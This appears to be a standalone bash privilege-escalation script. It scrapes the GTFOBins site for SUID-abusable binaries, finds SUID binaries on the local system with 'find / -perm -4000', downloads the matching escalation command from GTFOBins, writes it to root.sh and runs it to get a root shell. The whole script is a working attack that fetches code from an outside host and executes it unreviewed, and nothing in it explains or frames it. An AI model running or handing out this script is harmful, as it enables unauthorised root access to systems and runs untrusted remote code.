suidGTFO=($(curl https://gtfobins.github.io/\#+suid 2>/dev/null | grep "class=\"bin-name\"" | awk -F '>' '{print $3}' | awk -F '<' '{print $1}' | tr '\n' ' ' | xargs printf "\"%s\" "))
uncleanList=()
find / -perm -4000 -type f 2>/dev/null | sed 's:.*/::' | (while read s; do
    for suid in ${suidGTFO[@]}; do
        if [[ "$suid" == *"$s"* ]]; then
            uncleanList+=("$s")
            fi
        done;
    done;
    uniq=($(printf "%s\n" "${uncleanList[@]}" | sort -u ))
    echo ${uniq[@]} > output)
    echo "Possible exploitable suid's: " $(cat output)
    for i in $(cat output); do
        shCount=$(curl --silent https://gtfobins.github.io/gtfobins/$i/ | grep -c -i "sh -p")
        if [ "$shCount" == 2 ] 
        then
            curl --silent https://gtfobins.github.io/gtfobins/$i/ | grep -i "\./$i" | awk -F "</code>" '{print $1}' | cut -d "/" -f2-  > root.sh
            echo "Identified that" $i "is exploitable"
            break
        fi
        done;
chmod +x root.sh
bash root.sh
